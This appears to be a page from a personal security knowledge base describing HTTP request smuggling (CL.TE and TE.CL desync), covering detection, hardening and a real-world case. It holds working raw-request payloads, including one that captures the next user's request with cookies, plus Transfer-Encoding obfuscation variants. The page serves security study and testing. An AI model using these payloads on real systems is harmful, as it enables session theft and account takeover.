---
title: CL.TE and TE.CL desync
slug: cl-te-desync
created_utc: 2026-05-19T00:00:00Z
updated_utc: 2026-05-19T00:00:00Z
tags: [technique/request-smuggling, technique/desync, header/Content-Length, header/Transfer-Encoding]
inbound: []
---

# CL.TE and TE.CL desync

## Pattern

The front-end and back-end disagree on which header determines the body boundary.

- **CL.TE**: front-end honors `Content-Length`, back-end honors `Transfer-Encoding: chunked`. The front-end forwards `CL` bytes as the body; the back-end stops at the first `0\r\n\r\n` chunk and treats whatever follows as the start of the next request.
- **TE.CL**: opposite. Front-end honors chunked encoding, back-end honors `Content-Length`. The front-end reassembles the chunks and forwards them; the back-end reads only `CL` bytes and treats the remainder of the dechunked body as the next request.

In both variants, attacker-controlled bytes end up parsed by the back-end as a fresh HTTP request — prepended to whatever the next victim sends on the same pooled connection.

## Preconditions

- HTTP/1.1 keep-alive between front-end and back-end (almost universal).
- Two HTTP parsers in the path that disagree on framing precedence. RFC 7230 says `Transfer-Encoding` wins if both are present, but real-world deployments differ.
- Front-end does not strip or reject ambiguous framing — a hardened front-end (recent nginx + `proxy_http_version 1.1` with `chunked_transfer_encoding off`) closes the loophole.

## Detection

- Time-based: send a TE.CL probe whose chunked body promises more bytes than `Content-Length` allows; if back-end blocks waiting for bytes the front-end already shipped, the connection hangs until timeout (commonly 30–60 s). Use Burp Repeater's "Detect HTTP Request Smuggling" tooling or HTTP Request Smuggler extension.
- Differential: smuggle a request to `/404-deliberate` and see whether the *next* request on the same connection returns a 404 it shouldn't.
- Header reflection: if the application reflects request headers anywhere (debug page, error message, logged response), smuggle a request that puts attacker-controlled bytes into the reflected position; observe what the victim's response leaks.

## Triggering

Classic CL.TE PoC against a vulnerable lab:

```
POST / HTTP/1.1
Host: target.example
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

Front-end reads 13 bytes (`0\r\n\r\nSMUGGLED`), forwards the whole thing as one request. Back-end honors chunked, sees `0\r\n\r\n` terminator, parses `SMUGGLED` as the start of a second request.

Replace `SMUGGLED` with a real request to capture the next user's prefix:

```
POST / HTTP/1.1
Host: target.example
Content-Length: 192
Transfer-Encoding: chunked

0

POST /comments HTTP/1.1
Host: target.example
Content-Length: 800
Content-Type: application/x-www-form-urlencoded

comment=
```

Back-end now waits for 800 bytes of `comment=` body. The next victim's full request (cookies and all) becomes that body and gets stored as their comment — readable to the attacker.

## Bypasses (TE obfuscation)

Front-ends sometimes parse `Transfer-Encoding` strictly; back-ends are looser, or vice versa. Common obfuscations that flip which side ignores the header:

```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding:  chunked
Transfer-Encoding: chunked\r\n X-Foo: bar
Transfer-Encoding:[tab]chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
 : chunked
```

Send the same body twice with different obfuscations until one side accepts and the other rejects.

## Impact ladder

1. **Steal next request prefix** → captured cookies → ATO.
2. **Front-end auth bypass** → reach `/admin` past WAF or auth proxy.
3. **Cache poisoning** → see [../cache-poisoning/smuggling-to-cache.md](../cache-poisoning/smuggling-to-cache.md).
4. **Reflected XSS amplifier** → smuggle a request that returns reflected XSS to whoever else is on the connection.

## Seen-in-the-wild

- PortSwigger desync paper — PayPal `c.paypal.com/webstatic/r/fb/fb-all-prod.pp2.min.js` hijacked via TE.CL chained to cache, persistently serving attacker JS to the PayPal login page. See [research-http-desync-attacks-request-smuggling-reborn](../../sources/blogs/personal/portswigger-research/research-http-desync-attacks-request-smuggling-reborn.md).

## References

- [HTTP Request Smuggling SUMMARY](SUMMARY.md)
- [research-http-desync-attacks-request-smuggling-reborn](../../sources/blogs/personal/portswigger-research/research-http-desync-attacks-request-smuggling-reborn.md)
- [hacktricks: http-request-smuggling](../../_external/hacktricks/src/pentesting-web/http-request-smuggling/README.md)
